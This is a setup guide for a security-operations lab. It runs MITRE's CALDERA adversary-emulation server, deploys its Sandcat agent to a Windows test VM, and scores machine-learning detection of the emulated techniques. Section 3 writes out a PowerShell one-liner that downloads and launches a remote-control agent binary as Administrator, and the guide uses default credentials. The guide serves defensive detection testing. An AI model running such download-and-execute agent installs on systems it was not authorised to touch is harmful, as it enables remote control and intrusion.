# CALDERA Live Simulation Setup

CALDERA is MITRE's adversary emulation platform. This guide covers running
the server in Docker (recommended), deploying a Sandcat agent to the Windows
victim VM, and wiring the operation output into `caldera_monitor.py` for live
detection scoring.

---

## 1. Start CALDERA in Docker (recommended)

**Prerequisites:** The main SOC ML Lab stack must already be running so the
`soc_net` Docker network exists.

```bash
# 1. Add CALDERA credentials to your .env (copy from .env.example if needed)
#    Generate a random key:
python3 -c "import secrets; print(secrets.token_hex(20))"
# Paste the output as CALDERA_API_KEY= in .env

# 2. Start CALDERA (attaches to the existing soc_net)
docker compose -f docker-compose.caldera.yml up -d

# 3. Tail logs until you see "All systems ready" (~30–60 s on first run)
docker logs -f soc_caldera
```

Open `http://localhost:8889` — log in as **red / redpassword**
(port 8889 on the host; 8888 is already used by the Jupyter container) (or whatever
you set for `CALDERA_RED_PASSWORD` in `.env`).

### How credentials flow

`docker-compose.caldera.yml` passes `CALDERA_API_KEY` from `.env` into the
container as an environment variable. The entrypoint script
(`docker/caldera/entrypoint.sh`) writes it into `conf/local.yml` at startup —
so the key never needs to be hardcoded in a file.

The same `CALDERA_API_KEY` value is passed to the `jupyter` container so
`caldera_monitor.py` can authenticate against the API.

---

## 2. Alternative: run CALDERA directly on the Mac host

Use this if Docker resource contention is an issue (CALDERA pulls ~2–3 GB of
plugin data on first run).

**Requirements:** Python 3.8–3.12, pip, git.

```bash
git clone https://github.com/mitre/caldera.git --recursive --branch 5.0.0
cd caldera
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

# Create conf/local.yml with your API key
cat > conf/local.yml <<'EOF'
host: 0.0.0.0
port: 8888
api_key_red:  YOUR_API_KEY_HERE
api_key_blue: YOUR_API_KEY_HERE
users:
  red:
    red: redpassword
  blue:
    blue: bluepassword
EOF

python server.py --insecure
```

Set the matching values in `.env`:
```
CALDERA_URL=http://localhost:8888
CALDERA_API_KEY=YOUR_API_KEY_HERE
```

---

## 3. Deploy a Sandcat agent to the Windows victim VM

CALDERA's default agent is **Sandcat** (a compiled Go binary). The Windows VM
needs HTTP access to port 8888 on the Mac host.

1. **Agents** → **Deploy an agent** → choose **Sandcat**.
2. Select platform: **Windows**.
3. Copy the PowerShell one-liner — it downloads and starts the agent binary:
   ```powershell
   $url="http://<mac-host-ip>:8888/file/download";
   $wc=New-Object System.Net.WebClient;
   $wc.Headers.add("platform","windows");
   $wc.Headers.add("file","sandcat.go-windows");
   $data=$wc.DownloadData($url);
   $name=$data.Length;
   get-process | ? {$_.modules.filename -eq "$Env:APPDATA\$name.exe"} | stop-process -f;
   rm -force "$Env:APPDATA\$name.exe" -ea ignore;
   [io.file]::WriteAllBytes("$Env:APPDATA\$name.exe",$data) | out-null;
   Start-Process -FilePath "$Env:APPDATA\$name.exe" `
     -ArgumentList "-server http://<mac-host-ip>:8888 -group red" -NoNewWindow
   ```
   Replace `<mac-host-ip>` with the Mac's IP on the local network
   (not `localhost` — the Windows VM is a different machine).
4. Run the one-liner in PowerShell **as Administrator** on the Windows VM.
5. Back in the CALDERA UI → **Agents**: the new agent should appear within 30 s.

> **Firewall note**: port 8888 must be open inbound on the Mac.
> macOS: System Settings → Network → Firewall → allow incoming on 8888.
> Quick allow (temporary): `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/bin/python3`

---

## 4. Create and run a test operation

1. **Operations** → **Create operation**.
2. Name: `SOC Lab Test`.
3. Adversary: **"Super" Thief** (built-in, 2–3 techniques — good first test).
   Or build your own: **Adversaries** → **New adversary** → add abilities
   (e.g. T1087 Account Discovery, T1082 System Information Discovery,
   T1070.004 File Deletion).
4. Group: **red** (the group your Sandcat agent registered with).
5. Click **Start** and watch links execute in the UI.
6. Copy the operation UUID from the URL bar:
   `http://localhost:8889/#/operations/<UUID-HERE>`

---

## 5. Run caldera_monitor.py against the operation

```bash
# From the soc-ml-lab project root — monitor a live operation
python3 src/redblue/caldera_monitor.py \
    --operation-id <UUID-HERE> \
    --poll-interval 30 \
    --verbose

# Dry-run mode (polls CALDERA but skips ES queries — useful for checking API auth)
python3 src/redblue/caldera_monitor.py \
    --operation-id <UUID-HERE> \
    --dry-run

# Demo mode — no live CALDERA or ES needed; writes a synthetic scorecard
python3 src/redblue/caldera_monitor.py --demo
```

The monitor writes `data/runs/live_detection_YYYY-MM-DD.json` when the
operation finishes. Open the Streamlit dashboard → **Coverage Gap** tab.

To run from inside the jupyter container (where `CALDERA_URL=http://caldera:8888`):

```bash
docker exec soc_jupyter python3 /home/jovyan/work/src/redblue/caldera_monitor.py \
    --operation-id <UUID-HERE>
```

---

## 6. Understanding the scorecard

| Field | Meaning |
|---|---|
| `detection_rate` | Fraction of techniques where the IF model flagged an event within 90 s |
| `avg_detection_latency_seconds` | Mean seconds from technique execution to first ML detection |
| `missed_techniques` | ATT&CK IDs the model did not flag — your coverage gaps |
| `detected` count | Techniques that triggered at least one anomaly in the detection window |

A technique is "detected" if **any** event from the target host scores
`ml.anomaly_score ≥ 0.5` within 90 seconds of the CALDERA link completing.
Tune with `--detection-threshold` (lower = count near-misses) and
`--detect-window` (higher = accommodate slower sensor pipelines).

---

## 7. Red/Blue improvement loop

```
simulate (CALDERA) → detect (Isolation Forest)
      ↓                       ↓
  scorecard             coverage gap panel
      ↓                       ↓
   missed?  ←── LLM suggestion ← Streamlit Tab 2
      ↓
  add feature / tune model → retrain → repeat
```

See CLAUDE.md § "Red/Blue simulation loop" for the full 6-step workflow.
